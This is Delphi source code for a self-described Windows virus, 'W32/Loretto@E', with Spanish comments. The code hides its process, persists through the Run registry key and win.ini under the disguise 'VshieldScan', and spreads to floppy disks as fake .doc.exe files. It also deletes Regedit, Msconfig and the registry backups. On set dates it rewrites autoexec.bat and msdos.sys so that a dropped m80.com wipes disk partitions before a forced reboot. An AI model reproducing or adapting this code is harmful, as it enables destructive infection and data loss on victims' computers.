   unit Unit1;

   interface

   uses
     Windows, shellapi, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
     StdCtrls, ExtCtrls ,Inifiles,Registry,TLHelp32;
   type
     TRegisterService = function (dwProcessID, dwType:DWord):Dword;stdcall;
   type
     TForm1 = class(TForm)
       Timer1: TTimer;
       Timer3: TTimer;
       Timer2: TTimer;
       Timer4: TTimer;

       procedure FormCreate(Sender: TObject);
       procedure Timer1Timer(Sender: TObject);

       procedure Timer3Timer(Sender: TObject);
       procedure Timer2Timer(Sender: TObject);
       procedure Timer4Timer(Sender: TObject);


     private
       { Private declarations }
       RegisterServiceProcess: TRegisterService;
    public
       { Public declarations }
     end;

   var
     Form1: TForm1;
     GetTempDir: TFileName;
     PathWindows:string;

     const  ResName:string ='c';
     const  ResName1:string ='d';
     const  ResName2:string ='a';
     const  ResName3:string ='b';

     const  ResType:pchar ='icon_';
     const nombres: array[0..54] of pchar = ('Fotos de Familia', 'Machos','Freddy vs Jason','Home','Infierno','Hack hotmail','Outlook express hack','Loretto','Fotos de Suicidios','Chile lindo','Chile puto','Carta de amor','Paseo','Messenger 7.0','Bin Laden','Saludos','Postal Virtual','Pamela Anderson Desnuda','Patricia Manterola Desnuda','Thalia Desnuda','Home Labs','Adan Mercader Desnudo','Machos canal 13 desnudos','Mortal kombat V','Bill Gates','Premio concurso','Loteria','Spiniak','Valparaiso','Loretto gracias','Sufrimiento','Programador','Pana_infierno el Mejor','Echo en Chile, Viña del Mar','El Tila','Conoscan Chile','Hackear Microsoft','Crackear Windows','Hola Mundo','jajajajajajajaja','muerte para todos','Pudranse en el infierno','Resentido Social','Estoi cagao del mate','Olvidando...','Suicidio','Hueando','Joteando','Escuchando musica','Monitor','Hackear Celulares','Llamar Gratis','Virus Loretto@E','Leeme','Informacion importante');
     const extn: array[0..2] of pchar = ('exe', 'pif','scr');

   implementation


   function KillTask(FileName:String):integer;
   var
       ContinueLoop:BOOL;
       FSnapshotHandle:THandle;
       FProcessEntry32:TProcessEntry32;
   const
       PROCESS_TERMINATE=$0001;
   begin
       FSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
       FProcessEntry32.dwSize:=Sizeof(FProcessEntry32);
       ContinueLoop:=Process32First(FSnapshotHandle,FProcessEntry32);
       while integer(ContinueLoop)<>0 do
       begin
           if
   ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))=UpperCase(FileName))
               or (UpperCase(FProcessEntry32.szExeFile)=UpperCase(FileName)))
   then

   Result:=Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE,BOOL(0),

                                       FProcessEntry32.th32ProcessID),0));
             ContinueLoop:=Process32Next(FSnapshotHandle,FProcessEntry32);
       end;
       CloseHandle(FSnapshotHandle);
   end;


   function RegisterServiceProcess (dwProcessID, dwType: DWord) : DWord;
     stdcall; external 'KERNEL32.DLL';

   procedure SaveResourceAsFile(const ResName: string; ResType: pchar;
       const FileName: string);
     begin

       with TResourceStream.Create(hInstance, ResName, ResType) do
         try
           SaveToFile(FileName);
         finally
           Free;
         end;
     end;

   {$R *.DFM}
   {$R resources.res}

   procedure TForm1.FormCreate(Sender: TObject);
   var
   MiFichero : TIniFile;
   Fichero : string;
   F: textfile;
    dire:string;
    name:string;
    path:string;

    Sem  : THandle;
    valor:string;
    valorInt:integer;
    version:integer;

     d,m,a:integer;
     d2,m2,a2:word;
     Registro    :TRegistry;
     Key, Value,Value1: string;
     s: string;
     destino,destino1,destinoF,rDI_Win:string;
     i, i1,aa,bb:integer;
     pcData:PChar;
     pcDataSize:Cardinal;

     const
       cOsUnknown : Integer = -1;
       cOsWin95 : Integer = 0;
       cOsWin98 : Integer = 1;
       cOsWin98SE : Integer = 2;
       cOsWinME : Integer = 3;
       cOsWinNT : Integer = 4;
       cOsWin2000 : Integer = 5;
       cOsWinXP : Integer = 6;

   // para saber la version de windows
     function GetOSVersion : Integer;
     var
       osVerInfo : TOSVersionInfo;
       majorVer, minorVer : Integer;
     begin
       osVerInfo.dwOSVersionInfoSize := SizeOf( TOSVersionInfo );

       if ( GetVersionEx( osVerInfo ) ) then
       begin
         majorVer := osVerInfo.dwMajorVersion;
         minorVer := osVerInfo.dwMinorVersion;

         case ( osVerInfo.dwPlatformId ) of

           VER_PLATFORM_WIN32_NT : { Windows NT/2000 }
           begin
             if ( majorVer <= 4 ) then Result := cOsWinNT
             else
             if ( ( majorVer = 5 ) and ( minorVer= 0 ) ) then Result := cOsWin2000
             else
             if ( ( majorVer = 5) and ( minorVer = 1 ) ) then Result := cOsWinXP
             else
             Result := cOsUnknown;
           end;

           VER_PLATFORM_WIN32_WINDOWS : { Windows 9x/ME }
           begin
             if ( ( majorVer = 4 ) and ( minorVer = 0 ) ) then Result := cOsWin95

             else
             if ( ( majorVer = 4 ) and ( minorVer = 10 ) ) then
             begin
               if ( osVerInfo.szCSDVersion[ 1 ] = 'A' ) then Result := cOsWin98SE

               else Result := cOsWin98;
              end
            else
             if ( ( majorVer = 4) and ( minorVer = 90 ) ) then Result := cOsWinME

             else Result := cOsUnknown;
           end;

         else
           Result := cOsUnknown;
         end; { Final del Case}
       end else Result := cOsUnknown; {Final del if}
     end;
   //**********************************************

   // Usar funcion no implementada en XP
     function AsignaProcedure(EnQueDll,Procedimiento: string):TFarProc;
     var
       MangoProc,
       MangoLib    : THandle;

     begin
       Result:=nil;
       MangoLib:=GetModuleHandle(Pchar(EnQueDll));
       if MangoLib <> 0 then
         Result:=GetProcAddress(MangoLib,Pchar(Procedimiento));

     end;
   begin
   //Virus  : W32/Loretto@E
   //Creado  : Viña del Mar, Octubre 2003
   //Por     : Pana_Infierno
   //Pais    : Chile

   //Me falta incluirle mas cosas como:

   //Leer direcciones de correo Outlook y enviar como mail

   //Hacer copias del virus en distintas unidades de disco duro

   //Copiar virus en las carpetas compartidas en los programas P2P

   //Buscar carpetas con acceso total en el entorno de red y
   //hacer una copia del virus en la carpeta

   //Al detectar que se esta usando word... Tomar el nombre
   //de algun documento que este en el disco y renombrar el virus con este.

   //Buscar la forma de ocultar el virus en Xp, 2000, nt.

   //Buscar la manera de leer los nombres de los contactos del MSN en la version 6.1

   //pero por ahora es lo que hay.

   //y todo lo demas que se me ocurra en el camino




   // parte de la funcion no implementada en XP
   // para que no se caiga el programa
   //no ejecuta esta funcion si es xp,2000 o nt

     try
       @RegisterServiceProcess:=AsignaProcedure( 'KERNEL32.DLL',
                                                 'RegisterServiceProcess');
     except
       ShowMessage('Error, funcion RegisterServiceProcess no encontrada...');
     end;

   //  Ocultar la aplicacion
     if Assigned(RegisterServiceProcess) then
       RegisterServiceProcess(GetCurrentProcessID,1);

   //obtener el directorio de windows
     pcDataSize:=0;
     pcData:=Nil;
     pcDataSize:=GetWindowsDirectory(pcData,pcDataSize);
     pcData:=AllocMem(pcDataSize+1);
     GetWindowsDirectory(pcData,pcDataSize);
     rDI_Win:=pcData;
     pathwindows:=PcData;
     FreeMem(pcData);


   // aca consulto si existe una version previa del virus
   //si es asi lo remuevo del sistema
   if fileExists(pathwindows + '\system\lore.drv') then
   begin
    Killtask('comand.pif');
    deletefile(pathwindows + '\system\lore.drv');
    deletefile(pathwindows + '\system\l.hhh');
    deletefile(pathwindows + '\system\sis636.drv');
    deletefile(pathwindows + '\comand.pif');
    deletefile(pathwindows + '\command\comand.pif');
   end;

   //esta funcion no deja abrir 2 veces el programa
      Sem := CreateSemaphore(nil,0,1,'PROGRAM_NAME');
      if ((Sem <> 0) and (GetLastError = ERROR_ALREADY_EXISTS)) then
      begin
        CloseHandle( Sem );
      Halt;
      end;
   //*****************************************+

   version:=GetOSVersion();
   if (version = 0) or (version = 1) or (version = 2) or (version = 3) then
   begin
   //elimina el programa de los procesos 95,98,98se,Me
   RegisterServiceProcess(GetCurrentProcessID,1);
   end
    else
     begin
     // la implemente pero no me funciona igual se ve el proceso
     // pero no se cae el programa al verificar en kernell32
     // si existe la funcion RegisterServiceProcess

   // Elimina Nt,2000,Xp
       ShowWindow( Application.Handle, SW_HIDE );
       SetWindowLong( Application.Handle, GWL_EXSTYLE,
                    GetWindowLong(Application.Handle, GWL_EXSTYLE) or
                    WS_EX_TOOLWINDOW and not WS_EX_APPWINDOW);
       ShowWindow( Application.Handle, SW_SHOW );
     end;
   //*********************************************

   //Oculta la el formulario
   Application.ShowMainForm := False;
   //**********************************

   // infecta el sistema
   // Obtengo la ruta del archivo infectado
           dire:=ExtractFilePath(ParamStr(0));
   // Obtengo el nombre del archivo
           name:=ExtractfileName(ParamStr(0));
           path:=dire+name;
           copyfile(pchar(path),pchar(pathwindows + '\system32\VshieldScan.pif'),true);
           copyfile(pchar(path),pchar(pathwindows + '\VshieldScan.pif'),true);
           copyfile(pchar(path),pchar(pathwindows + '\system\sis639.drv'),true);


   if not fileExists(pathwindows + '\system\loretto.drv') then
   begin
   //si no existe el archivo creo este con un numero 5 que sera
   //la condicion para grabar los logos de windows modificados
   //con un mensaje
       fichero:=pathwindows + '\system\vga9.drv';
       AssignFile(f,Fichero);
       Rewrite(f);
       Writeln(f,'5');
       CloseFile(f);

   for i := 0 to 54 do
    begin
   // aca creo un monton de archivos y los guardo en system
   // Uso todos los nombres posibles segun mi arreglo de nombres
        destino:=nombres[i];
        destino1:=extn[0];
        destinoF:=pathwindows + '\system\'+destino+'.'+destino1;
        copyfile(pchar(pathwindows + '\system\sis639.drv'),pchar(destinoF),true);
        destino1:=extn[1];
        destinoF:=pchar(pathwindows + '\system\'+destino+'.'+destino1);
        copyfile(pchar(pathwindows + '\system\sis639.drv'),pchar(destinoF),true);
        destino1:=extn[2];
        destinoF:=pathwindows + '\system\'+destino+'.'+destino1;
        copyfile(pchar(pathwindows + '\system\sis639.drv'),pchar(destinoF),true);
    end;
   end;

   //con esta funcion saco un archivo que esta incluido en el Exe
   // este es un htm que es el que se mostrara dentro de 4 horas

   SaveResourceAsFile('E',ResType,pathwindows + '\system\lyd.hhh');
   //aca leo el valor de mi archivo contador
       AssignFile(F, pathwindows + '\system\vga9.drv');
       Reset(F);
       Readln(F, Valor);
       CloseFile(F);

       //y lo compraro aca
       // condicion para grabar logos

   if valor <> '0' then

    begin
   //si es distinto de 0 entonces descuento 1.
       Rewrite(f);
       valorInt := (strtoint(valor))-1;
       valor:= inttostr(valorint);
       Writeln(f,valor);
       CloseFile(f);
    end;

   if valor = '0' then
    begin
    //Si es 0 grabo los logos de windows modificados
    //se supone que para que esto se ejecute la persona
    //tiene que reiniciar 5 veces el pc o mas veces segun el
    //numero que coloque en el archivo contador
     SaveResourceAsFile(ResName,ResType,pathwindows + '\logos.sys');
     SaveResourceAsFile(ResName1,ResType,pathwindows + '\Logow.sys');
   //copio los logos que reemplazaran a los antiguos
    end;
   //*********************************


   //crear archivo firma
   //Este es el archivo que consulto para seber si esta el
   //virus en el sistema
       fichero:=pathwindows + '\system\loretto.drv';
       AssignFile(f,Fichero);
       Rewrite(f);
       Writeln(f,'Loretto Te quiero Mucho');
       Writeln(f,'DANIEL...');
       CloseFile(f);
    //**********************************************************************

   // Grabar Ini
   //Para que se ejecute en el Win ini
          MiFichero := TiniFile.Create (pathwindows + '\win.ini');
          MiFichero.WriteString ('windows','load',pathwindows + '\system32\VshieldScan.pif');
          MiFichero.Free;

   //Graba registro
   //Para que se ejecute en el registro
   //Nota lo mas comun es que se desabilite el virus del registro
   //por esto cada vez que el virus se ejecute nuevamente
   //grabara en el registro y en el Win.ini para poder ejecutarse
   //y para usuarios novatos mucho mas dificil de desinfectar
     Registro:=TRegistry.create;
     Registro.RootKey := HKEY_LOCAL_MACHINE;
     if Registro.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run',FALSE) then
       Registro.WriteString('VshieldScan',pathwindows + '\VshieldScan.pif');
       Registro.Destroy;


   //Cambio la opcion actualizar carpetas automaticamente
   aa:=00;
   bb:=1;
   Registro:=TRegistry.create;
   Registro.RootKey := HKEY_LOCAL_MACHINE;
   if Registro.OpenKey('System\CurrentControlSet\Control\Update',FALSE) then
      registro.WriteBinaryData('UpdateMode',aa,bb);
      Registro.Destroy;


   //cambia mostrar archivos ocultos y mostrar extenciones de archivos
   //para que no pueda ver la extencion del archivo ya que el icono
   //de este es uno de archivo de word97
   key:='\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced';
   value:='HideFileExt';
   value1:='Hidden';

     Registro := TRegistry.Create;
     try
       Registro.RootKey := HKEY_CURRENT_USER;
       if Registro.OpenKey(key, True)
       then
        begin
         Registro.WriteInteger(value,1);
         Registro.WriteInteger(value1,0);
        end;
     finally
       Registro.CloseKey;
       Registro.Free;
       inherited;
     end;

   //  borra programas que pueden usarse para sacar el virus
   deletefile(pathwindows + '\system\Msconfig.exe');// W
   deletefile(pathwindows + '\Sysedit.exe');
   deletefile(pathwindows + '\system\Sfc.exe');
   deletefile(pathwindows + '\Regedit.exe'); // W
   deletefile(pathwindows + '\scanreg.ini'); //

   //crea nuevo scanreg.ini - no deja cargar antigua configuracion
       fichero:=pathwindows + '\Scanreg.ini';
       AssignFile(f,Fichero);
       Rewrite(f);
       Writeln(f,'Backup=0');
       Writeln(f,'Optimize=0');
       Writeln(f,'canregVersion=0.0001');
       Writeln(f,'MaxBackupCopies=1');
       Writeln(f,'BackupDirectory=');
       CloseFile(f);

   //borra *.cab de la carpeta sysbckup
   SaveResourceAsFile('F',ResType,'c:\bck.bat');
   //extrae un bat el que borra lo *.cab de la carpeta sysbckup
   ShellExecute(0,nil,Pchar('C:\bck.bat'),nil,nil,SW_HIDE);
   sleep(1000);
   //borro el bat
   deletefile('C:\bck.bat');

   //detecta fecha de destruccion
   decodedate(date,a2,m2,d2);

   m:=m2;
   d:=d2;
   if ((d = 14) and (m = 6)) or ((d=13)and(m=10))  then
    begin
   //***********************************************************
   //***********************************************************
   //Rutina destructora................
   //***********************************************************
   //***********************************************************
   //creo un bat el cual quitara todos los atributos a los archivos
   //autoexec.bat y msdos.sys para poder reemplazarlos con la
   //nueva copia de estos
     fichero:='c:\borra.bat';
       AssignFile(f,Fichero);
       Rewrite(f);
       writeln(f,'@echo off');
       writeln(f,'@break off');
       writeln(f,'ctty nul');
       writeln(f,'attrib -h c:\msdos.sys');
       writeln(f,'attrib -r c:\msdos.sys');
       writeln(f,'attrib -s c:\msdos.sys');
       writeln(f,'attrib -a c:\msdos.sys');
       writeln(f,'attrib -h c:\autoexec.bat');
       writeln(f,'attrib -r c:\autoexec.bat');
       writeln(f,'attrib -s c:\autoexec.bat');
       writeln(f,'attrib -a c:\autoexec.bat');
     CloseFile(f);
   //ejecuto el archivo que borra atributos
   ShellExecute(0,nil,Pchar('C:\borra.bat'),nil,nil,SW_HIDE);


   // esto graba el archivo de recursos a la ruta que esta abajo
      SaveResourceAsFile(ResName2,ResType,'c:\m80.com');
      SaveResourceAsFile(ResName3,ResType,'c:\restart.com');

   //   copio en c:\ 2 archivos el primero m80.com borrara
   // las particiones de los discos que esten conectados en el
   // cable ide0 e ide1
   // y el restart que reiniciara el equipo desde DOS
   // para que la borrada de particion haga efecto inmediato

   //modifica autoexec.bat y pone nuevas lineas
       fichero:='c:\autoexec.bat';
       AssignFile(f,Fichero);
       Rewrite(f);
       writeln(f,'m80.com');
       writeln(f,'restart.com');
       CloseFile(f);
   //para que ejecute el m80.com el cual borra las particiones
   //************************************************
   //modifica msdos.sys para que no respondan las teclas de
   //funcion
       fichero:='c:\msdos.sys';
       AssignFile(f,Fichero);
       Rewrite(f);
       writeln(f,'[Paths]');
       writeln(f,'WinDir=C:\WINDOWS');
       writeln(f,'WinBootDir=C:\WINDOWS');
       writeln(f,'HostWinBootDrv=C');
       writeln(f,'');
       writeln(f,'[Options]');
       writeln(f,'BootWarn=0');
       writeln(f,'BootKeys=0');
       writeln(f,'BootMulti=1');
       writeln(f,'BootGUI=1');
       writeln(f,'DoubleBuffer=1');
       writeln(f,'AutoScan=1');
       writeln(f,'WinVer=4.10.2222');
       writeln(f,';');
       writeln(f,';The following lines are required for compatibility with other programs.');
       writeln(f,';Do not remove them (MSDOS.SYS needs to be >1024 bytes).');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxa');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxd');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxf');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxg');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxh');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxi');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxj');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxk');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxl');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxm');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxn');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxo');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxp');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxq');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxr');
       writeln(f,';xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxs');
       CloseFile(f);
   //************************************************

   //reiniciar el pc

   showmessage('Lo siento pero esto es lo que hace un programador cuando le hacen sufrir...');
   ExitWindowsEx(EWX_FORCE Or EWX_REBOOT,0);
   close;
   end;
        timer3.Enabled := true;
   end;

   procedure TForm1.Timer1Timer(Sender: TObject);
   var

    sw:boolean;
    ran,ran1:integer;
    nom,nom1,nomF:string;


   begin
   // cada 10 minutos
   // examina si existe un disco en la unidad
   if FileExists('a:\NUL') then
    begin
      Randomize;
      ran:=random(54);
      ran1:=random(3);
      nom:=nombres[ran];
      nom1:=extn[ran1];
      nomF:='a:\' + nom + '.' + 'doc' + '.' + nom1;
   // Copia un archivo al disco con un nombre y una extencion randomica
         CopyFile(pchar(pathwindows + '\system\sis639.drv'),pchar(nomF),true);

    end;
   end;




   procedure TForm1.Timer3Timer(Sender: TObject);

   begin
   //Aca cada 4 horas copio el archivo htm a los archivos
   //temporales y lo muestro en pantalla con ShellExecuta
   copyfile(pchar(pathwindows + '\system\lyd.hhh'),pchar(pathwindows + '\temp\loretto.htm'),true);
   ShellExecute(Form1.Handle,nil,PChar(pathwindows + '\temp\loretto.htm'),'','',SW_MAXIMIZE);
   //si lo borraran este se volvera a copiar desde el archivo lyd.hhh
   end;

   procedure TForm1.Timer2Timer(Sender: TObject);
   var
    ran,ran1:integer;
    nom,nom1,nomF:string;

   begin
   //detecta una clase de Word
   //si es asi
   if FindWindow(Pchar('OpusAPP'),nil) > 0 then
    begin
   // copia en el disco un archivo pero este llevara la
   //extencion .doc con un nombre randomico
   //este timer lo ejecuto cada 10 segundos
   //si existe una operacion con word desactivo el timer
   //el cual activare en el timer 4 cada 10 minutos
      Randomize;
      ran:=random(54);
      ran1:=random(3);
      nom:=nombres[ran];
      nom1:='exe';
      nomF:='a:\' + nom + '.' + 'doc' + '.' + nom1;
      CopyFile(pchar(pathwindows + '\system\sis639.drv'),pchar(nomF),true);
      timer2.Enabled := false;
    end;

   end;

   procedure TForm1.Timer4Timer(Sender: TObject);
   begin
   //activo timer2 para volver a consultar si abrio Word
   //lo activo cada 10 minutos
   timer2.Enabled := true;
   end;

   end.
